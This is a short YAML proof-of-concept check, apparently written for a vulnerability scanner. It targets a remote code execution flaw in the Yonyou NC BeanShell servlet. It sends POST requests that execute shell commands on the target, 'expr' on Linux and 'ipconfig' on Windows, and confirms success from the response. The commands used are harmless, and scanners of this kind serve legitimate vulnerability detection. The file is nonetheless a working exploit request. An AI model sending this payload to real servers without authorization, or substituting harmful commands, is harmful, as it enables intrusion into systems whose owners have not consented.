name: poc-yaml-yonyou-nc-bsh-servlet-bshservlet-rce
set:
  r1: randomInt(800000000, 1000000000)
  r2: randomInt(800000000, 1000000000)
groups:
  linux:
    - method: POST
      path: /servlet/~ic/bsh.servlet.BshServlet
      body: bsh.script=exec("expr {{r1}} + {{r2}}");
      expression: |
        response.status == 200 && response.body.bcontains(bytes(string(r1 + r2)))
  windows:
    - method: POST
      path: /servlet/~ic/bsh.servlet.BshServlet
      body: bsh.script=exec("ipconfig");
      expression: |
        response.status == 200 && response.body.bcontains(b"Windows IP") && response.body.bcontains(b"IPv6") && response.body.bcontains(b"IPv4")
detail:
  author: B1anda0(https://github.com/B1anda0)
  links:
    - https://mp.weixin.qq.com/s/FvqC1I_G14AEQNztU0zn8A